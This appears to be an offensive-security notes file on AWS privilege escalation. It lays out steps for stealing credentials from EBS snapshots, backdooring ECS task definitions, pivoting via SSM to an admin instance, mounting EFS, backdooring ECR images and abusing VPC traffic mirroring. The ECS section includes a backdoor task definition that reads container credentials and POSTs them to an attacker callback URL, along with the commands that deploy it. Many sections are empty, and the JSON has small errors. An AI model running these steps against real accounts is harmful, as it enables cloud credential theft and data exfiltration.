# AWS Privilege Escalation - II

### EBS direct APIs and Snapshot

**Description:** 

- Attacker enumerates all of the Elastic Block Store volumes, snapshots, and snapshot permissions in the account
- Downloading if any EBS snapshot available
- Explore th snapshot using Vagrant and Virtualbox
- Steal credentials from it

**How to Exploit??**

    dsnap get <instance-id> # Pacu feature 
    
The temporary snapshot is downloaded to i-0d706e33814c1ef9a.img

    $ IMAGE="i-0d706e33814c1ef9a.img" vagrant up
    $ IMAGE="i-0d706e33814c1ef9a.img" vagrant ssh

**Potential Impact:**

Using the EBS Direct APIs can be a simple and effective way to exfiltrate data and discover secrets in an AWS network without alerting anyone.
Can be alerted by monitoring `ec2:ModifySnapshotAttribute` attribute

---

### S3 Ransomware

**Description:** 

- 

**How to Exploit??**



**Potential Impact:**



---

### ECS EFS attack

**Description:** 

- Pivoting through AWS Elastic Container Service and gaining access to AWS Elastic File Share

**How to Exploit??**

Phase 1 - IAM Privilege Enumeration

- configure the AWS CLI to use the instance profile.
- check for these permissions => "ecs:Register
Definition", "ecs:UpdateService" and "ec2:createTags"

Phase 2 - EC2 and ECS Enumeration

    aws ec2 describe-instances     # View ec2s
    aws ecs list-clusters
    aws ecs list-services --cluster {cluster_name}  #List servicers in cluster
    aws ecs describe-services --cluster {cluster_name} --services webapp
    
Phase 3 - ECS privilege escalation

- ECS has three main parts:-
- **Cluster** : the highest level of abstraction in ECS; it is simply a grouping of Tasks or Services
- **Service** : long-running Task that can be composed of one or many containers
- **Task** : running container defined by a Task definition
    
Phase 4 - Preparing backdoor

To create a backdoor in the Task definition, we first need to download the current Task definition and modify it. It’s from this step that we gather the information needed to create the backdoor.

    {
      "containerDefinitions": [
        {
          "name": "webapp",
        "name": "webapp",
          "image": "python:latest",
          "cpu": 128,
          "memory": 128,
          "memoryReservation": 64,
          "portMappings": [
            { "containerPort": 80, "hostPort": 80, "protocol": "tcp" }
          ],
          "essential": true,
          "entryPoint": ["sh", "-c"],
          "command": [
            "/bin/sh -c \"curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST -d @data.json {{CALLBACK URL}} \" "
          ],
          "environment": [],
          "mountPoints": [],
          "volumesFrom": []
        }
      ],
      "family": "webapp",
      "taskRoleArn": "ECS_ROLE_ARN",
      "executionRoleArn": "ECS_ROLE_ARN"
      "networkMode": "awsvpc",
      "volumes": [],
      "placementConstraints": [],
      "requiresCompatibilities": ["FARGATE"],
      "cpu": "256",
      "memory": "512"
    }

The payload to launch a python container and POSTs credentials to a <CALLBACK URL>

Copy the taskRoleArn and executionRoleArn from the previous task version. 

Finally, we register the new Task definition which will create a new revision titled “webapp:99”.

    aws describe-task-definition --task-definition webapp:1 > taskdef.json
    aws register-task-definition --generate-cli-skeleton > backdoor.json

Phase 5 - Deliver payload

    aws register-task-definition --cli-input-json file://backdoor.json
    aws ecs update-service --service {service_arn} --cluster {cluster_arn} --task-definition {backdoor_task}
    
An interesting behavior to note is that our task definition POSTs our credentials, then exits. As a result, <Older TD> will continue to run and ECS will continuously redeploy <BACKDOORED TD> and send us credentials periodically

Phase 6 - Pivot to Admin EC2

In the policy we find an interesting tag based policy. The policy allows "ssm:StartSession" on any EC2 with the tag pair "StartSession: true"
We change tags of running instance and start session using AWS SSM

    aws configure --profile ecs
    aws ec2 create-tags --resource {admin_ec2_instance_id} --tags “Key=StartSession, Value=true”
    aws ssm start-session --target {admin_ec2_instance_id} --profile ecs

Phase 7 - Scan port 2049

Nmap scan for port 2049 within internal IP range

Phase 8 - Mount EFS and steal the data

Once you find the EFS, you mount it and steal the data

    cd /mnt
    sudo mkdir efs 
    sudo mount -t nfs -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport {EFS_IP}:/ efs

**Potential Impact:**

Data exfiltration using ECS and EFS combination

---

### IAM Security flaws

**Description:** 

- 

**How to Exploit??**



**Potential Impact:**



---

### Cloudtrail CSV Injection

**Description:** 

- 

**How to Exploit??**



**Potential Impact:**



---

### Enumerate AWS users using AssumeRole

**Description:** 

- 

**How to Exploit??**



**Potential Impact:**



---

### Bypass Cloudtrail logging

**Description:** 

- 

**How to Exploit??**



**Potential Impact:**



---

### IAM user enumeration using Account ID

**Description:** 

- 

**How to Exploit??**



**Potential Impact:**



---

### Compromising AWS IAM credentials

**Description:** 

- 

**How to Exploit??**



**Potential Impact:**



---

### Unauthenticated AWS Role Enumeration

**Description:** 

- 

**How to Exploit??**



**Potential Impact:**



---

### IAM privilege escalation using CodeStar API

**Description:** 

- 

**How to Exploit??**



**Potential Impact:**



---

### Phishing AWS users with MFA enabled

**Description:** 

- 

**How to Exploit??**



**Potential Impact:**



---

### Bypass IP based block using AWS API gateway

**Description:** 

- 

**How to Exploit??**



**Potential Impact:**



---

### Phished AWS persistent cookies

**Description:** 

- 

**How to Exploit??**



**Potential Impact:**



---

### Capital One breach

**Description:** 

- 

**How to Exploit??**



**Potential Impact:**



---

### Exploiting AWS ECS and ECR

**Description:** 

- Amazon Elastic Container Service for Kubernetes (EKS) is another service that can be used to run containers on AWS. It allows you to “deploy, manage, and scale containerized applications using Kubernetes on AWS.”

- Amazon Elastic Container Registry (ECR) is a container repository used to store Docker images. The images are encrypted and compressed at rest so that they are quick to pull and secure.

- Both Amazon ECS and EKS can pull Docker images directly from Amazon ECR when deploying containers. Through this, we can use backdoored containers to compromise massive environments with ease.

**How to Exploit??**

- Must have compromised AWS credentials
- List ECR repositories
- Pull ECR repository
- Create backdoored Docker image
- Push backdored docker image back to ECR

**Potential Impact:**

- Adversary can gain access within internal network may lead to total compromise and data exfiltration

---

### Abuse VPC traffic mirroring

**Description:** 

- Many companies will also use cleartext protocols within their internal networks because of the large impact that TLS has on performance.
- Note that VPC Traffic Mirroring is only supported by EC2 instance types that are powered by the AWS **Nitro** system and that the VPC mirror target must be within the same VPC as any hosts that are being mirrored.

**How to Exploit??**

Prerequisites to perform this attack

    1. An S3 bucket to exfiltrate the mirrored traffic to (likely in your own AWS account).
    2. AWS credentials stored in an AWS CLI profile (likely belonging to a user in your own AWS account). This user should have write/s3:PutObject access to the S3 bucket the PCAP files will be exfiltrated to.
    3. AWS credentials stored in an AWS CLI profile (belonging to the account you are deploying the mirrors into) with the following IAM permissions:
        ec2:DescribeInstances -> To identify EC2 instances to mirror
        ec2:RunInstances -> To create an EC2 instance that will be the VPC mirror target
        ec2:CreateSecurityGroup -> To create a security group for our EC2 instance
        ec2:AuthorizeSecurityGroupIngress -> To allow inbound access to our EC2 instance
        ec2:CreateTrafficMirrorTarget -> To specify our EC2 instance as a VPC mirror target
        ec2:CreateTrafficMirrorSession -> To create mirror sessions for each EC2 instance we want to mirror
        ec2:CreateTrafficMirrorFilter -> To create the traffic filter for our mirroring sessions
        ec2:CreateTrafficMirrorFilterRule -> To specify we want all traffic mirrored to our EC2 instance

After syncing the PCAP files to your local system, you can start analyzing them. 
You likely won’t be able to do anything with the encrypted data, but cleartext traffic has the potential for a lot of abusable findings.

**Potential Impact:**

- Some common things to look for include API keys, authentication tokens/cookies, usernames/passwords, PII/PHI, files, and IP addresses/hostnames. 

---

Reference -> [Rhinosecurity](https://rhinosecuritylabs.com/blog/)
